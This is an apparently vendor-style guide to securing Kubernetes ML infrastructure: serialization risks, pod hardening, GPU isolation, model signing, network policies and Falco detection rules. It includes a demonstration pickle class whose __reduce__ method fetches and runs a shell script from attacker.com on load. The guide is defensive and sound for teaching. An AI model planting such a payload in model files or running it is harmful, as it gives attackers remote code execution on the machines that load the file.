Kubernetes AI Security: Protecting the ML Pipeline

Enterprise hardening for GPU clusters, model registries, and MLOps infrastructure

28 min read | Intermediate to Advanced | January 2026
Research Ethics: This guide covers defensive security measures for Kubernetes-hosted AI workloads. Attack techniques described are from publicly disclosed research for defensive awareness.
Abstract: Organizations deploying AI/ML workloads on Kubernetes face unique security challenges: GPU resource sharing, model artifact integrity, serialization vulnerabilities, and MLOps pipeline attacks. This guide provides a comprehensive security architecture for protecting the entire ML lifecycle—from training data ingestion through model serving. We examine real-world supply chain attacks against ML systems, detail Kubernetes-specific hardening for GPU workloads, and provide production-ready security configurations. Target audience: Platform engineers, DevSecOps teams, and security architects managing AI infrastructure.

2. ML Supply Chain Threats

The ML ecosystem relies heavily on pre-trained models, datasets, and libraries from public sources—each a potential attack vector.

2024-2026 ML Supply Chain Incidents

Date Incident Vector Impact
Dec 2025 Hugging Face Model Backdoor Malicious model on Model Hub Cryptocurrency mining on inference servers
Aug 2025 PyTorch Typosquat Malicious package "pytorch-nightly-cu123" Credential theft from training environments
Mar 2025 Pickle Bomb Campaign Weaponized .pkl files on Kaggle RCE when models loaded
Nov 2024 TensorFlow SavedModel RCE Arbitrary code in saved_model.pb Server compromise on model load
Critical Risk: Never load models from untrusted sources without inspection. Python's pickle format executes arbitrary code during deserialization—this is by design, not a bug.

3. Model Serialization Attacks

Model serialization formats are the most critical vulnerability in ML infrastructure. The following formats support arbitrary code execution:

Format Frameworks RCE Risk Mitigation
Pickle (.pkl, .pt) PyTorch, scikit-learn Critical Use SafeTensors, weights-only loading
SavedModel TensorFlow High Signature validation, sandboxing
ONNX Cross-platform Medium-High Restrict custom ops
SafeTensors Hugging Face Low Preferred safe format

Pickle RCE Exploit Example

# WARNING: Educational demonstration of Pickle RCE
# Never execute untrusted pickle files!

import pickle
import os

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))

# When victim loads: model = torch.load('model.pt')
# The __reduce__ method automatically executes the payload

Defense: PyTorch Safe Loading

# SAFE: Load only tensor weights, not arbitrary objects
import torch

# PyTorch 2.0+ supports weights_only=True
model_weights = torch.load(
    'model.pt',
    weights_only=True,  # Blocks arbitrary code execution
    map_location='cpu'
)

# Or use SafeTensors (recommended)
from safetensors.torch import load_file
model_weights = load_file('model.safetensors')

4. Kubernetes Hardening for AI Workloads

Pod Security Standards for ML Workloads

apiVersion: v1
kind: Pod
metadata:
  name: ml-training-pod
  labels:
    app: model-training
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: trainer
    image: ml-training:v1.0
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
    resources:
      limits:
        nvidia.com/gpu: 1
        memory: "32Gi"
        cpu: "8"
      requests:
        nvidia.com/gpu: 1
        memory: "16Gi"
        cpu: "4"
    volumeMounts:
    - name: model-output
      mountPath: /models
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: model-output
    persistentVolumeClaim:
      claimName: model-storage
  - name: tmp
    emptyDir:
      medium: Memory
      sizeLimit: "1Gi"

Key Security Controls

  • runAsNonRoot: Prevents container root access even if image misconfigured
  • readOnlyRootFilesystem: Blocks persistent malware installation
  • capabilities drop ALL: Removes all Linux capabilities
  • Resource limits: Prevents GPU/CPU exhaustion attacks

5. GPU Security Considerations

GPUs present unique security challenges in multi-tenant Kubernetes environments:

Risk Description Mitigation
GPU Memory Leakage Previous tenant data remains in GPU memory Memory isolation contexts, MIG partitioning
Side-Channel Attacks Cache timing attacks on shared GPUs Dedicated GPU allocation per workload
Driver Vulnerabilities NVIDIA driver CVEs enable host escape Regular patching, driver containment

NVIDIA MIG (Multi-Instance GPU) for Isolation

# Enable MIG on A100/H100 for secure multi-tenancy
nvidia-smi mig -cgi 9,9,9 -C

# Kubernetes resource request for MIG slice
resources:
  limits:
    nvidia.com/mig-1g.5gb: 1

6. Securing the Model Registry

Registry Security Checklist

Model Registry Controls:
  • Require signed model artifacts (cosign/Sigstore)
  • Block pickle uploads—require SafeTensors format
  • Implement RBAC for model promotion (dev → staging → prod)
  • Scan model artifacts for known malicious patterns
  • Log all model downloads with user attribution

Model Signing with Cosign

# Sign model artifact before upload
cosign sign --key cosign.key \
  registry.company.com/models/llm-v1:latest

# Verify signature before deployment
cosign verify --key cosign.pub \
  registry.company.com/models/llm-v1:latest

7. Network Policies for ML Clusters

apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: ml-training-isolation
  namespace: ml-workloads
spec:
  podSelector:
    matchLabels:
      app: model-training
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          app: ml-orchestrator
  egress:
  # Allow model registry access
  - to:
    - namespaceSelector:
        matchLabels:
          app: model-registry
    ports:
    - port: 443
  # Allow internal DNS
  - to:
    - namespaceSelector: {}
      podSelector:
        matchLabels:
          k8s-app: kube-dns
    ports:
    - port: 53
      protocol: UDP
  # Block all other egress (no internet access)

8. Detection & Monitoring

Falco Rules for ML Infrastructure

- rule: Suspicious Model File Load
  desc: Detect loading of pickle/pt files from untrusted locations
  condition: >
    spawned_process and 
    proc.name = python and
    (fd.name contains ".pkl" or fd.name contains ".pt") and
    not fd.name startswith "/models/approved/"
  output: >
    Potentially malicious model loaded 
    (user=%user.name command=%proc.cmdline file=%fd.name)
  priority: WARNING
  tags: [ml-security, supply-chain]

- rule: GPU Memory Dump Attempt
  desc: Detect attempts to dump GPU memory
  condition: >
    spawned_process and 
    (proc.name = nvidia-smi or proc.cmdline contains "cuda-gdb") and
    proc.cmdline contains "dump"
  output: >
    GPU memory dump attempt detected 
    (user=%user.name command=%proc.cmdline)
  priority: CRITICAL
  tags: [ml-security, data-exfil]
